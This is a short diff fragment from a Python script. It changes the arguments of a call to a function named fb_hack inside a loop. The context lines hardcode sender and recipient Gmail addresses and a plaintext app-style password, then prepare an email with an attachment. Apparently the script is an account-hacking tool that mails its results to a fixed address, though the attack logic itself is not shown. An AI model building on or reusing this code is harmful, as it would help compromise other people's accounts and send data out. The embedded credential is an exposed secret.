@@ -135,7 +135,7 @@ sender_email = input("Your Email:") or "krarktel@gmail.com"
 receiver_email = input("Recipient:") or "ppteam36884@gmail.com"
 password = input("Type your password and press enter:") or "dvxu atqv cngc rojf"
 while past != 0:
-  fb_hack(ehack, reset)
+  fb_hack(ehack, reset, past)
 
 
 subject = "An email with attachment from Python"
